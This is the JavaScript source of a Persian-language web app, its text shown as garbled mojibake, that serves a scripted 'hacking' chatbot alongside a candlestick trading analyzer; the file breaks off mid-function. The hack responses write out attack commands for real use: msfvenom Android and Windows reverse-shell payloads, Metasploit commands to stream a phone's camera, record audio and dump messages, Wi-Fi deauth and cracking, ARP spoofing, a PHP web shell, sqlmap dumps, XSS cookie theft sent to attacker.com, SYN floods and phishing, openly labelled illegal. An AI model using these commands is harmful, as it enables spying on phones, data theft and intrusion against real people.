addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);
  const path = url.pathname;

  if (path === '/' || path === '') return new Response(getMainPage(), { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
  if (path === '/hack') return new Response(getHackPage(), { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
  if (path === '/hack/chat') {
    const query = url.searchParams.get('q') || 'Ø³Ù„Ø§Ù…';
    return new Response(JSON.stringify({ response: hackChatResponse(query) }), { headers: { 'Content-Type': 'application/json' } });
  }
  if (path === '/trade') return new Response(getTradePage(), { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
  if (path === '/trade/chat') {
    const query = url.searchParams.get('q') || 'ØªØ­Ù„ÛŒÙ„';
    return new Response(JSON.stringify({ response: tradeChatResponse(query) }), { headers: { 'Content-Type': 'application/json' } });
  }
  if (path === '/chat') return new Response(getChatPage(), { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
  if (path === '/chat/chat') {
    const query = url.searchParams.get('q') || 'Ø³Ù„Ø§Ù…';
    return new Response(JSON.stringify({ response: chatResponse(query) }), { headers: { 'Content-Type': 'application/json' } });
  }
  return new Response('404: Ù…Ø³ÛŒØ± Ù¾ÛŒØ¯Ø§ Ù†Ø´Ø¯', { status: 404 });
}

function getMainPage() {
  return `
    <!DOCTYPE html>
    <html lang="fa">
    <head>
      <meta charset="UTF-8">
      <title>Ø§Ø³Ø·ÙˆØ±Ù‡ Ù†Ø¬Ø§Øªâ€ŒØ¯Ù‡Ù†Ø¯Ù‡</title>
      <style>
        body { margin: 0; padding: 0; font-family: 'Arial', sans-serif; background: linear-gradient(45deg, #0d1b2a, #1b263b, #415a77); height: 100vh; display: flex; justify-content: center; align-items: center; direction: rtl; overflow: hidden; }
        .container { text-align: center; background: rgba(0, 0, 0, 0.7); padding: 50px; border-radius: 25px; box-shadow: 0 0 50px rgba(0, 255, 255, 0.5), 0 0 100px rgba(255, 0, 255, 0.3); animation: glow 2s infinite alternate; }
        h1 { color: #00ffff; font-size: 3em; text-shadow: 0 0 20px #00ffff, 0 0 40px #ff00ff; margin-bottom: 40px; }
        .button { display: inline-block; padding: 20px 40px; margin: 15px; background: linear-gradient(135deg, #ff00ff, #00ffff); color: #fff; text-decoration: none; border-radius: 15px; font-size: 1.5em; transition: transform 0.3s, box-shadow 0.3s; box-shadow: 0 0 20px rgba(255, 0, 255, 0.7); }
        .button:hover { transform: scale(1.1); box-shadow: 0 0 40px rgba(0, 255, 255, 0.9); }
        @keyframes glow { 0% { box-shadow: 0 0 50px rgba(0, 255, 255, 0.5); } 100% { box-shadow: 0 0 50px rgba(255, 0, 255, 0.5); } }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>Ø§Ø³Ø·ÙˆØ±Ù‡ Ù†Ø¬Ø§Øªâ€ŒØ¯Ù‡Ù†Ø¯Ù‡</h1>
        <a href="/hack" class="button">Ù‡Ú© Ø§Ø³Ø·ÙˆØ±Ù‡â€ŒØ§ÛŒ</a>
        <a href="/trade" class="button">ØªØ±ÛŒØ¯ Ø§Ø³Ø·ÙˆØ±Ù‡â€ŒØ§ÛŒ</a>
        <a href="/chat" class="button">Ú†Øª Ø§Ø³Ø·ÙˆØ±Ù‡â€ŒØ§ÛŒ</a>
      </div>
    </body>
    </html>
  `;
}

function getHackPage() {
  return `
    <!DOCTYPE html>
    <html lang="fa">
    <head>
      <meta charset="UTF-8">
      <title>Ù‡Ú© Ø§Ø³Ø·ÙˆØ±Ù‡â€ŒØ§ÛŒ</title>
      <style>
        body { margin: 0; padding: 20px; font-family: 'Arial', sans-serif; background: #0d1b2a; color: #fff; direction: rtl; min-height: 100vh; }
        .chat-container { max-width: 1000px; margin: 0 auto; background: rgba(0, 0, 0, 0.8); padding: 30px; border-radius: 20px; box-shadow: 0 0 30px rgba(255, 0, 255, 0.5), inset 0 0 20px rgba(0, 255, 255, 0.3); }
        h1 { color: #ff00ff; text-shadow: 0 0 15px #ff00ff; font-size: 2.5em; text-align: center; }
        .input-area { display: flex; gap: 15px; margin-top: 20px; }
        input { flex: 1; padding: 15px; border: none; border-radius: 10px; background: linear-gradient(135deg, #1b263b, #415a77); color: #fff; font-size: 1.2em; box-shadow: 0 0 10px rgba(0, 255, 255, 0.5); }
        button { padding: 15px 30px; background: linear-gradient(135deg, #ff00ff, #00ffff); border: none; border-radius: 10px; color: #fff; font-size: 1.2em; cursor: pointer; box-shadow: 0 0 15px rgba(255, 0, 255, 0.7); transition: transform 0.3s; }
        button:hover { transform: scale(1.05); }
        #response { margin-top: 30px; padding: 20px; background: rgba(255, 255, 255, 0.05); border-radius: 15px; white-space: pre-wrap; text-align: right; font-size: 1.1em; box-shadow: inset 0 0 20px rgba(0, 255, 255, 0.2); line-height: 1.6; }
      </style>
    </head>
    <body>
      <div class="chat-container">
        <h1>Ù‡Ú© Ø§Ø³Ø·ÙˆØ±Ù‡â€ŒØ§ÛŒ</h1>
        <div class="input-area">
          <input id="query" type="text" placeholder="Ù‡Ø± Ú†ÛŒØ²ÛŒ Ø¯Ø±Ø¨Ø§Ø±Ù‡ Ù‡Ú© Ø¨Ù¾Ø±Ø³ (Ú¯ÙˆØ´ÛŒØŒ Ú¯Ø§Ù„Ø±ÛŒØŒ Ø´Ø¨Ú©Ù‡ØŒ ÙˆØ¨ØŒ Ù‡Ø± ØªÚ©Ù†ÛŒÚ©ÛŒ)">
          <button onclick="sendChat()">Ø§Ø±Ø³Ø§Ù„</button>
        </div>
        <div id="response"></div>
      </div>
      <script>
        async function sendChat() {
          const query = document.getElementById('query').value;
          const res = await fetch('/hack/chat?q=' + encodeURIComponent(query));
          const data = await res.json();
          document.getElementById('response').innerText = data.response;
        }
      </script>
    </body>
    </html>
  `;
}

function hackChatResponse(query) {
  query = query.toLowerCase();
  if (query.includes('Ø³Ù„Ø§Ù…')) return `
âœ¨ Ø³Ù„Ø§Ù… Ø¬Ù†Ú¯Ø¬ÙˆÛŒ Ø³Ø§ÛŒØ¨Ø±ÛŒ! âœ¨
Ù…Ù† Ø§ÛŒÙ†Ø¬Ø§Ù… ØªØ§ Ù‡Ø± Ù†ÙˆØ¹ Ù‡Ú© Ø±Ùˆ Ø§Ø² ØµÙØ± ØªØ§ 1000 Ø¨Ø§ Ø¬Ø²Ø¦ÛŒØ§Øª Ø´ÛŒÚ© Ùˆ ÙˆØ§Ø¶Ø­ ÛŒØ§Ø¯Øª Ø¨Ø¯Ù….
Ù‚Ø§Ù†ÙˆÙ†ÛŒ ÛŒØ§ ØºÛŒØ±Ù‚Ø§Ù†ÙˆÙ†ÛŒ (ÙÙ‚Ø· ØªØ¦ÙˆØ±ÛŒ)ØŒ Ù‡Ø± Ú†ÛŒØ²ÛŒ Ø¨Ø®ÙˆØ§ÛŒ Ø¨Ú¯Ùˆ!
Ú†ÛŒ ØªÙˆ Ø°Ù‡Ù†ØªÙ‡ØŸ
  `;
  else if (query.includes('Ú¯ÙˆØ´ÛŒ') || query.includes('Ù…ÙˆØ¨Ø§ÛŒÙ„')) return `
ğŸ“± Ù‡Ú© Ú¯ÙˆØ´ÛŒ - Ø§Ø² ØµÙØ± ØªØ§ 1000 ğŸ“±
--------------------------------
ğŸ”¹ Ø³Ø§Ø¯Ù‡:
   - ÙÛŒØ´ÛŒÙ†Ú¯ Ø¨Ø§ ØµÙØ­Ù‡ Ø¬Ø¹Ù„ÛŒ (HTML+PHPØŒ Ø¯Ø§Ù…Ù†Ù‡ Ø±Ø§ÛŒÚ¯Ø§Ù† Ù…Ø«Ù„ .tkØŒ Ù„ÛŒÙ†Ú© Ú©ÙˆØªØ§Ù‡ Ø¨Ø§ bit.ly).
ğŸ”¹ Ù…ØªÙˆØ³Ø·:
   - Ù¾ÛŒÙ„ÙˆØ¯ Ø¨Ø§ msfvenom:
     "msfvenom -p android/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -o hack.apk"
   - Ø§Ø¬Ø±Ø§ ØªÙˆ Metasploit:
     "use exploit/android/meterpreter/reverse_tcp" > "set LHOST <your_ip>" > "exploit"
   - Ú©Ù†ØªØ±Ù„:
     - Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø²Ù†Ø¯Ù‡: "webcam_stream"
     - Ø¶Ø¨Ø· ØµØ¯Ø§: "record_mic"
     - Ù¾ÛŒØ§Ù…â€ŒÙ‡Ø§: "dump_sms"
     - Ù…Ø®Ø§Ø·Ø¨ÛŒÙ†: "dump_contacts"
ğŸ”¹ Ù¾ÛŒØ´Ø±ÙØªÙ‡:
   - Zero-day Ù…Ø«Ù„ Stagefright:
     "use exploit/android/browser/stagefright_mp4_tx3g"
   - Root Ø¨Ø§ Magisk + ØªØ²Ø±ÛŒÙ‚ Ø¨Ø¯Ø§ÙØ²Ø§Ø±.
ğŸ”¹ Ú¯Ø§Ù„Ø±ÛŒ:
   - "shell" > "find /sdcard/DCIM -name '*.jpg'" (Ø¬Ø³ØªØ¬Ùˆ)
   - "download <path>" (Ø¯Ø§Ù†Ù„ÙˆØ¯)
   - "rm <path>" (Ø­Ø°Ù)
ğŸ”¹ ØºÛŒØ±Ù‚Ø§Ù†ÙˆÙ†ÛŒ (ØªØ¦ÙˆØ±ÛŒ):
   - ØªØ²Ø±ÛŒÙ‚ Ù¾ÛŒÙ„ÙˆØ¯ ØªÙˆ Ø§Ù¾Ù„ÛŒÚ©ÛŒØ´Ù† Ù…Ø­Ø¨ÙˆØ¨ Ø¨Ø§ APKToolØŒ Ù¾Ø®Ø´ ØªÙˆ Ù…Ø§Ø±Ú©Øª ØºÛŒØ±Ø±Ø³Ù…ÛŒ.
ğŸ”¹ Ø¯ÙØ§Ø¹:
   - Ø±Ù…Ø²Ù†Ú¯Ø§Ø±ÛŒ AESØŒ Ù‚ÙÙ„ bootloaderØŒ Ø¢Ù†ØªÛŒâ€ŒÙˆÛŒØ±ÙˆØ³ØŒ Ø¢Ù¾Ø¯ÛŒØª Ø³ÛŒØ³ØªÙ….
--------------------------------
Ù‡Ø± Ø¨Ø®Ø´ Ø±Ùˆ Ø¨ÛŒØ´ØªØ± Ø¨Ø®ÙˆØ§ÛŒØŒ Ø¨Ú¯Ùˆ!
  `;
  else if (query.includes('Ú¯Ø§Ù„Ø±ÛŒ')) return `
ğŸ–¼ï¸ Ù‡Ú© Ú¯Ø§Ù„Ø±ÛŒ Ú¯ÙˆØ´ÛŒ - Ø´ÛŒÚ© Ùˆ Ú©Ø§Ù…Ù„ ğŸ–¼ï¸
--------------------------------
ğŸ”¹ Ø¯Ø³ØªØ±Ø³ÛŒ:
   - Ù¾ÛŒÙ„ÙˆØ¯: "msfvenom -p android/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -o gallery.apk"
   - Metasploit: "use exploit/android/meterpreter/reverse_tcp" > "exploit"
ğŸ”¹ Ø¬Ø³ØªØ¬Ùˆ:
   - "shell" > "find /sdcard/DCIM -name '*.jpg'" (Ø¹Ú©Ø³â€ŒÙ‡Ø§)
   - "find /sdcard/Pictures" (Ú¯Ø§Ù„Ø±ÛŒ Ø§Ø¶Ø§ÙÛŒ)
ğŸ”¹ Ø¯Ø§Ù†Ù„ÙˆØ¯:
   - "download /sdcard/DCIM/Camera/photo.jpg"
ğŸ”¹ Ø­Ø°Ù:
   - "rm /sdcard/DCIM/Camera/photo.jpg"
ğŸ”¹ Ù¾ÛŒØ´Ø±ÙØªÙ‡:
   - Ø¢Ù¾Ù„ÙˆØ¯ Ø¨Ø¯Ø§ÙØ²Ø§Ø±: "upload <malware.apk>"
   - Ø±Ù…Ø²Ù†Ú¯Ø§Ø±ÛŒ ÙØ§ÛŒÙ„â€ŒÙ‡Ø§: "openssl enc -aes-256-cbc -in photo.jpg -out photo.enc"
ğŸ”¹ Ø¯ÙØ§Ø¹:
   - Ù…Ø­Ø¯ÙˆØ¯ Ú©Ø±Ø¯Ù† Ø¯Ø³ØªØ±Ø³ÛŒ Ú¯Ø§Ù„Ø±ÛŒ (Permissions)ØŒ Ø±Ù…Ø²Ù†Ú¯Ø§Ø±ÛŒ Ø­Ø§ÙØ¸Ù‡.
--------------------------------
Ú†ÛŒØ²ÛŒ Ø¨ÛŒØ´ØªØ± Ù…ÛŒâ€ŒØ®ÙˆØ§ÛŒØŸ
  `;
  else if (query.includes('Ø´Ø¨Ú©Ù‡') || query.includes('ÙˆØ§ÛŒâ€ŒÙØ§ÛŒ')) return `
ğŸŒ Ù‡Ú© Ø´Ø¨Ú©Ù‡ Ùˆ ÙˆØ§ÛŒâ€ŒÙØ§ÛŒ - Ø§Ø² ØµÙØ± ØªØ§ 1000 ğŸŒ
--------------------------------
ğŸ”¹ Ø³Ø§Ø¯Ù‡:
   - Ø§Ø³Ú©Ù†: "nmap -sn 192.168.1.0/24"
ğŸ”¹ ÙˆØ§ÛŒâ€ŒÙØ§ÛŒ:
   - Ø¢Ù…Ø§Ø¯Ù‡â€ŒØ³Ø§Ø²ÛŒ: "airmon-ng start wlan0"
   - Ø§Ø³Ú©Ù†: "airodump-ng wlan0mon"
   - Ù‚Ø·Ø¹: "aireplay-ng --deauth 10 -a <BSSID>"
   - Ø±Ù…Ø²: "aircrack-ng <cap_file> -w <wordlist>"
ğŸ”¹ Ù…ØªÙˆØ³Ø·:
   - ARP Spoofing: "ettercap -T -M arp:remote /<target_ip>/ /<gateway_ip>/"
ğŸ”¹ Ù¾ÛŒØ´Ø±ÙØªÙ‡:
   - KRACK Attack: Ø§Ø¨Ø²Ø§Ø± krackattacks-scripts
   - Evil Twin AP: "hostapd" Ø¨Ø±Ø§ÛŒ Ù‡Ø§Øªâ€ŒØ§Ø³Ù¾Ø§Øª Ø¬Ø¹Ù„ÛŒ
ğŸ”¹ ØºÛŒØ±Ù‚Ø§Ù†ÙˆÙ†ÛŒ (ØªØ¦ÙˆØ±ÛŒ):
   - Ø´Ù†ÙˆØ¯ Ø¯Ø§Ø¦Ù…ÛŒ Ø¨Ø§ Ø¨Ø§Øªâ€ŒÙ†ØªØŒ Deauth Flood
ğŸ”¹ Ø¯ÙØ§Ø¹:
   - WPA3ØŒ VPNØŒ ÙÛŒÙ„ØªØ± MACØŒ ÙØ§ÛŒØ±ÙˆØ§Ù„
--------------------------------
Ù‡Ø± Ø¨Ø®Ø´ Ø±Ùˆ Ø¨Ø§Ø² Ú©Ù†Ù…ØŸ
  `;
  else if (query.includes('ÙˆØ¨') || query.includes('Ø³Ø§ÛŒØª')) return `
ğŸŒ Ù‡Ú© ÙˆØ¨â€ŒØ³Ø§ÛŒØª - Ø´ÛŒÚ© Ùˆ Ø­Ø±ÙÙ‡â€ŒØ§ÛŒ ğŸŒ
--------------------------------
ğŸ”¹ Ø³Ø§Ø¯Ù‡:
   - XSS: "<script>alert('hacked')</script>"
ğŸ”¹ Ù…ØªÙˆØ³Ø·:
   - SQL Injection: "sqlmap -u <url> --dbs" > "sqlmap -u <url> -D <db> -T <table> --dump"
ğŸ”¹ Ù¾ÛŒØ´Ø±ÙØªÙ‡:
   - Ø´Ù„: "echo '<?php system($_GET['cmd']); ?>' > shell.php"
   - RCE: "curl -d 'cmd=whoami' <url>/shell.php"
ğŸ”¹ Ø­Ø±ÙÙ‡â€ŒØ§ÛŒ:
   - LFI: "../../etc/passwd"
   - CSRF: ØªØºÛŒÛŒØ± Ø±Ù…Ø² Ø§Ø¯Ù…ÛŒÙ†
ğŸ”¹ ØºÛŒØ±Ù‚Ø§Ù†ÙˆÙ†ÛŒ (ØªØ¦ÙˆØ±ÛŒ):
   - DDoS Ø¨Ø§ LOICØŒ Deface Ø§Ù†Ø¨ÙˆÙ‡
ğŸ”¹ Ø¯ÙØ§Ø¹:
   - WAF (Cloudflare)ØŒ HTTPSØŒ CSP
--------------------------------
Ø¬Ø²Ø¦ÛŒØ§Øª Ø¨ÛŒØ´ØªØ±ØŸ
  `;
  else if (query.includes('Ø¯ÙØ§Ø¹') || query.includes('Ø§Ù…Ù†ÛŒØª')) return `
ğŸ›¡ï¸ Ø¯ÙØ§Ø¹ Ø¯Ø± Ø¨Ø±Ø§Ø¨Ø± Ù‡Ú© - Ú©Ø§Ù…Ù„ Ùˆ Ø´ÛŒÚ© ğŸ›¡ï¸
--------------------------------
ğŸ”¹ Ø³Ø§Ø¯Ù‡:
   - Ø±Ù…Ø² Ù‚ÙˆÛŒ (20 Ú©Ø§Ø±Ø§Ú©ØªØ±)ØŒ 2FA
ğŸ”¹ Ù…ØªÙˆØ³Ø·:
   - ÙØ§ÛŒØ±ÙˆØ§Ù„: "iptables -A INPUT -p tcp --dport 22 -j DROP"
   - Fail2ban Ø¶Ø¯ Brute Force
ğŸ”¹ Ù¾ÛŒØ´Ø±ÙØªÙ‡:
   - Honeypot: Cowrie
   - IDS: Snort
   - Ø±Ù…Ø²Ù†Ú¯Ø§Ø±ÛŒ SSH
ğŸ”¹ Ø­Ø±ÙÙ‡â€ŒØ§ÛŒ:
   - Ù…Ø§Ù†ÛŒØªÙˆØ±ÛŒÙ†Ú¯: Wireshark
   - Ø¨Ù„Ø§Ú© IP: "iptables -A INPUT -s <hacker_ip> -j DROP"
ğŸ”¹ Ø¯ÙØ§Ø¹ Ø§Ø² ØºÛŒØ±Ù‚Ø§Ù†ÙˆÙ†ÛŒ:
   - OSINT Ø¨Ø±Ø§ÛŒ Ø±Ø¯ÛŒØ§Ø¨ÛŒØŒ Ú¯Ø²Ø§Ø±Ø´ Ø¨Ù‡ Ù¾Ù„ÛŒØ³
--------------------------------
Ú†ÛŒØ²ÛŒ Ú©Ù…Ù‡ØŸ
  `;
  else if (query.includes('ÙÛŒØ´ÛŒÙ†Ú¯')) return `
ğŸ£ ÙÛŒØ´ÛŒÙ†Ú¯ - Ø§Ø² ØµÙØ± ØªØ§ 1000 ğŸ£
--------------------------------
ğŸ”¹ Ø³Ø§Ø¯Ù‡:
   - ØµÙØ­Ù‡ Ø¬Ø¹Ù„ÛŒ HTML (ÙˆØ±ÙˆØ¯ Ø§ÛŒÙ†Ø³ØªØ§)ØŒ Ø¯Ø§Ù…Ù†Ù‡ .tk
ğŸ”¹ Ù…ØªÙˆØ³Ø·:
   - SET: "setoolkit > 1 > 2 > 3"ØŒ Ù„ÛŒÙ†Ú© Ø¨Ø§ bit.ly
ğŸ”¹ Ù¾ÛŒØ´Ø±ÙØªÙ‡:
   - HTTPS Ø¨Ø§ Letâ€™s Encrypt
   - Ø§ÛŒÙ…ÛŒÙ„ Ø¬Ø¹Ù„ÛŒ: "sendmail -f <fake@email> <target>"
ğŸ”¹ Ø­Ø±ÙÙ‡â€ŒØ§ÛŒ:
   - Spear Phishing Ø¨Ø§ OSINT
ğŸ”¹ ØºÛŒØ±Ù‚Ø§Ù†ÙˆÙ†ÛŒ (ØªØ¦ÙˆØ±ÛŒ):
   - ÙÛŒØ´ÛŒÙ†Ú¯ Ø§Ù†Ø¨ÙˆÙ‡ Ø¨Ø§ Ø¨Ø§Øªâ€ŒÙ†Øª
ğŸ”¹ Ø¯ÙØ§Ø¹:
   - DKIM/SPFØŒ Ø¢Ù…ÙˆØ²Ø´ Ú©Ø§Ø±Ø¨Ø±
--------------------------------
Ø¨ÛŒØ´ØªØ± Ø¨Ú¯Ù…ØŸ
  `;
  else if (query.includes('sql') || query.includes('Ø¯ÛŒØªØ§Ø¨ÛŒØ³')) return `
ğŸ’¾ Ù‡Ú© Ø¯ÛŒØªØ§Ø¨ÛŒØ³ Ø¨Ø§ SQL Injection ğŸ’¾
--------------------------------
ğŸ”¹ Ø³Ø§Ø¯Ù‡:
   - "' OR 1=1 --"
ğŸ”¹ Ù…ØªÙˆØ³Ø·:
   - "sqlmap -u <url> --dbs" > "sqlmap -u <url> -D <db> --dump"
ğŸ”¹ Ù¾ÛŒØ´Ø±ÙØªÙ‡:
   - Blind SQL: "sqlmap -u <url> --technique=B"
   - Union: "SELECT * FROM users WHERE id=1 UNION SELECT 1,2,3"
ğŸ”¹ Ø­Ø±ÙÙ‡â€ŒØ§ÛŒ:
   - Ø¯Ø§Ù…Ù¾ Ù¾Ø³ÙˆØ±Ø¯: "sqlmap --passwords"
ğŸ”¹ ØºÛŒØ±Ù‚Ø§Ù†ÙˆÙ†ÛŒ (ØªØ¦ÙˆØ±ÛŒ):
   - ÙØ±ÙˆØ´ Ø¯ÛŒØªØ§ ØªÙˆ Ø¯Ø§Ø±Ú©â€ŒÙˆØ¨
ğŸ”¹ Ø¯ÙØ§Ø¹:
   - Prepared StatementsØŒ ORM
--------------------------------
Ú†ÛŒØ²ÛŒ Ø¯ÛŒÚ¯Ù‡ØŸ
  `;
  else if (query.includes('xss')) return `
âš¡ Ù‡Ú© Ø¨Ø§ XSS - Ø´ÛŒÚ© Ùˆ ÙˆØ§Ø¶Ø­ âš¡
--------------------------------
ğŸ”¹ Ø³Ø§Ø¯Ù‡:
   - "<script>alert('hacked')</script>"
ğŸ”¹ Ù…ØªÙˆØ³Ø·:
   - "<img src=x onerror=alert('hacked')>"
   - "<iframe src=malware.js>"
ğŸ”¹ Ù¾ÛŒØ´Ø±ÙØªÙ‡:
   - Ø¯Ø²Ø¯ÛŒ Ú©ÙˆÚ©ÛŒ: "fetch('https://attacker.com?cookie='+document.cookie)"
   - ØªØ²Ø±ÛŒÙ‚ DOM
ğŸ”¹ Ø­Ø±ÙÙ‡â€ŒØ§ÛŒ:
   - XSS Ù…Ø§Ù†Ø¯Ú¯Ø§Ø± ØªÙˆ Ø¯ÛŒØªØ§Ø¨ÛŒØ³
ğŸ”¹ ØºÛŒØ±Ù‚Ø§Ù†ÙˆÙ†ÛŒ (ØªØ¦ÙˆØ±ÛŒ):
   - Ù¾Ø®Ø´ Ø¨Ø¯Ø§ÙØ²Ø§Ø± Ø§Ù†Ø¨ÙˆÙ‡
ğŸ”¹ Ø¯ÙØ§Ø¹:
   - CSPØŒ encode Ø®Ø±ÙˆØ¬ÛŒ
--------------------------------
Ø¨ÛŒØ´ØªØ± ÛŒØ§Ø¯ Ø¨Ú¯ÛŒØ±ÛŒØŸ
  `;
  else if (query.includes('ddos') || query.includes('Ø­Ù…Ù„Ù‡')) return `
ğŸ’¥ Ø­Ù…Ù„Ø§Øª DDoS - Ø§Ø² ØµÙØ± ØªØ§ 1000 ğŸ’¥
--------------------------------
ğŸ”¹ Ø³Ø§Ø¯Ù‡:
   - Ù¾ÛŒÙ†Ú¯: "ping -t <ip> -l 65500"
ğŸ”¹ Ù…ØªÙˆØ³Ø·:
   - SYN Flood: "hping3 -S -p 80 --flood <ip>"
ğŸ”¹ Ù¾ÛŒØ´Ø±ÙØªÙ‡:
   - Ø¨Ø§Øªâ€ŒÙ†Øª: Mirai (ØªØ¦ÙˆØ±ÛŒ)
   - Slowloris
ğŸ”¹ Ø­Ø±ÙÙ‡â€ŒØ§ÛŒ:
   - Amplification Ø¨Ø§ NTP/DNS
ğŸ”¹ ØºÛŒØ±Ù‚Ø§Ù†ÙˆÙ†ÛŒ:
   - Ø­Ù…Ù„Ø§Øª ØªØ¬Ø§Ø±ÛŒ
ğŸ”¹ Ø¯ÙØ§Ø¹:
   - CloudflareØŒ Rate Limiting
--------------------------------
Ø¬Ø²Ø¦ÛŒØ§Øª Ø¨ÛŒØ´ØªØ±ØŸ
  `;
  else if (query.includes('Ø±Ù…Ø²') || query.includes('Ù¾Ø³ÙˆØ±Ø¯')) return `
ğŸ”‘ Ù‡Ú© Ø±Ù…Ø² - Ú©Ø§Ù…Ù„ Ùˆ Ø´ÛŒÚ© ğŸ”‘
--------------------------------
ğŸ”¹ Ø³Ø§Ø¯Ù‡:
   - Ø­Ø¯Ø³: "123456"ØŒ "admin"
ğŸ”¹ Ù…ØªÙˆØ³Ø·:
   - Brute Force: "hydra -l admin -P <wordlist> <ip> ssh"
ğŸ”¹ Ù¾ÛŒØ´Ø±ÙØªÙ‡:
   - Keylogger: "msfvenom -p windows/meterpreter/reverse_tcp -f exe > keylog.exe"
ğŸ”¹ Ø­Ø±ÙÙ‡â€ŒØ§ÛŒ:
   - Rainbow Table Ø¨Ø§ hashcat
ğŸ”¹ ØºÛŒØ±Ù‚Ø§Ù†ÙˆÙ†ÛŒ (ØªØ¦ÙˆØ±ÛŒ):
   - Ø¯Ø²Ø¯ÛŒ Ø±Ù…Ø² Ø§Ù†Ø¨ÙˆÙ‡
ğŸ”¹ Ø¯ÙØ§Ø¹:
   - Ø±Ù…Ø² Ù¾ÛŒÚ†ÛŒØ¯Ù‡ØŒ 2FAØŒ bcrypt
--------------------------------
Ú†ÛŒØ²ÛŒ Ú©Ù…Ù‡ØŸ
  `;
  else return `
ğŸŒŸ Ù…Ù† Ø§Ø³Ø·ÙˆØ±Ù‡ Ù‡Ú©â€ŒØ§Ù…! ğŸŒŸ
Ù‡Ø± Ù†ÙˆØ¹ Ù‡Ú© Ø§Ø² ØµÙØ± ØªØ§ 1000ØŒ Ø´ÛŒÚ© Ùˆ ÙˆØ§Ø¶Ø­:
--------------------------------
ğŸ”¹ Ú¯ÙˆØ´ÛŒ: ÙÛŒØ´ÛŒÙ†Ú¯ØŒ Ú¯Ø§Ù„Ø±ÛŒØŒ Ú©Ù†ØªØ±Ù„
ğŸ”¹ Ø´Ø¨Ú©Ù‡: ÙˆØ§ÛŒâ€ŒÙØ§ÛŒØŒ ARPØŒ MitM
ğŸ”¹ ÙˆØ¨: XSSØŒ SQLiØŒ Ø´Ù„ØŒ DDoS
ğŸ”¹ Ø¯ÙØ§Ø¹: ÙØ§ÛŒØ±ÙˆØ§Ù„ØŒ Honeypot
ğŸ”¹ ØªÚ©Ù†ÛŒÚ©â€ŒÙ‡Ø§: ÙÛŒØ´ÛŒÙ†Ú¯ØŒ KeyloggerØŒ Brute Force
--------------------------------
Ù‡Ø± Ú†ÛŒØ²ÛŒ Ú©Ù‡ ÙÚ©Ø±Ø´Ùˆ Ø¨Ú©Ù†ÛŒ ÛŒØ§Ø¯Øª Ù…ÛŒâ€ŒØ¯Ù…!
Ú†ÛŒ Ù…ÛŒâ€ŒØ®ÙˆØ§ÛŒØŸ (Ù…Ø«Ù„Ø§Ù‹ "Ù‡Ú© Ú¯Ø§Ù„Ø±ÛŒ"ØŒ "Ù‡Ú© Ø±Ù…Ø²")
  `;
}

function getTradePage() {
  return `
    <!DOCTYPE html>
    <html lang="fa">
    <head>
      <meta charset="UTF-8">
      <title>ØªØ±ÛŒØ¯ Ø§Ø³Ø·ÙˆØ±Ù‡â€ŒØ§ÛŒ</title>
      <style>
        body { margin: 0; padding: 20px; font-family: 'Arial', sans-serif; background: #1a1a2e; color: #fff; direction: rtl; min-height: 100vh; }
        .chat-container { max-width: 1000px; margin: 0 auto; background: rgba(0, 0, 0, 0.8); padding: 30px; border-radius: 20px; box-shadow: 0 0 30px rgba(0, 255, 255, 0.5); }
        h1 { color: #00ffff; text-shadow: 0 0 15px #00ffff; font-size: 2.5em; text-align: center; }
        .input-area { display: flex; gap: 15px; margin-top: 20px; }
        input { flex: 1; padding: 15px; border: none; border-radius: 10px; background: linear-gradient(135deg, #16213e, #415a77); color: #fff; font-size: 1.2em; }
        button { padding: 15px 30px; background: linear-gradient(135deg, #00ffff, #00b894); border: none; border-radius: 10px; color: #fff; font-size: 1.2em; cursor: pointer; box-shadow: 0 0 15px rgba(0, 255, 255, 0.7); }
        button:hover { transform: scale(1.05); }
        #response { margin-top: 30px; padding: 20px; background: rgba(255, 255, 255, 0.05); border-radius: 15px; white-space: pre-wrap; text-align: right; font-size: 1.1em; }
      </style>
    </head>
    <body>
      <div class="chat-container">
        <h1>ØªØ±ÛŒØ¯ Ø§Ø³Ø·ÙˆØ±Ù‡â€ŒØ§ÛŒ</h1>
        <div class="input-area">
          <input id="query" type="text" placeholder="Ø¯Ø§Ø¯Ù‡ Ú©Ù†Ø¯Ù„ Ø¨Ø¯Ù‡ (Ù…Ø«Ù„Ø§Ù‹: 100,105,110,95)">
          <button onclick="sendChat()">Ø§Ø±Ø³Ø§Ù„</button>
        </div>
        <div id="response"></div>
      </div>
      <script>
        async function sendChat() {
          const query = document.getElementById('query').value;
          const res = await fetch('/trade/chat?q=' + encodeURIComponent(query));
          const data = await res.json();
          document.getElementById('response').innerText = data.response;
        }
      </script>
    </body>
    </html>
  `;
}

function tradeChatResponse(query) {
  if (query.match(/\d+/g)) {
    const numbers = query.match(/\d+/g).map(Number);
    if (numbers.length >= 4) {
      const [open, close, high, low] = numbers.slice(0, 4);
      let advice = `ğŸ“ˆ ØªØ­Ù„ÛŒÙ„ Ø§Ø³Ø·ÙˆØ±Ù‡â€ŒØ§ÛŒ Ú©Ù†Ø¯Ù„ ğŸ“ˆ\n--------------------------------\n`;
      advice += `ğŸ”¹ Ø¯Ø§Ø¯Ù‡â€ŒÙ‡Ø§: Ø¨Ø§Ø²: ${open} | Ø¨Ø³ØªÙ‡: ${close} | Ø¨Ø§Ù„Ø§: ${high} | Ù¾Ø§ÛŒÛŒÙ†: ${low}\n`;
      const body = Math.abs(close - open);
      const upperShadow = high - Math.max(open, close);
      const lowerShadow = Math.min(open, close) - low;
      if (close > open) {
        advice += `ğŸ”¹ Ø±ÙˆÙ†Ø¯: ØµØ¹ÙˆØ¯ÛŒ\n`;
        if (body > upperShadow && body > lowerShadow && upperShadow < body * 0.1) {
          advice += `ğŸ”¹ Ø§Ù„Ú¯Ùˆ: Marubozu ØµØ¹ÙˆØ¯ÛŒ (Ù‚Ø¯Ø±Øª Ø¨ÛŒâ€ŒÙ†Ù‡Ø§ÛŒØª)\n`;
